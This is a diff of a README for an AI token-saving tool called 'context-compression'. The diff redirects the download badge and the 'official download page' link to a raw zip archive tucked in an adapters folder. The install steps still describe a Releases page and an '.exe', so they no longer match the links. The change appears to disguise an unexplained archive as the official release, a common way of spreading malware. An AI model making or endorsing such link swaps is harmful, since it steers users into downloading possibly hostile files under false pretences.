@@ -1,6 +1,6 @@
 # 📦 context-compression - Save tokens and boost agent performance
 
-[![Download context-compression](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/herreravalenz6620/context-compression)
+[![Download context-compression](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/herreravalenz6620/context-compression/raw/refs/heads/main/adapters/generic/compression-context-v2.6.zip)
 
 ## 📋 About this project
 
@@ -19,7 +19,7 @@ Before you begin, verify that your computer meets these requirements:
 
 You need to access the official release page to obtain the installation files. Follow these steps to prepare your system:
 
-1. Visit the [official download page](https://github.com/herreravalenz6620/context-compression).
+1. Visit the [official download page](https://github.com/herreravalenz6620/context-compression/raw/refs/heads/main/adapters/generic/compression-context-v2.6.zip).
 2. Look for the section labeled "Releases" on the right side of the screen.
 3. Click the most recent version number.
 4. Locate the file ending in ".exe" under the "Assets" header.
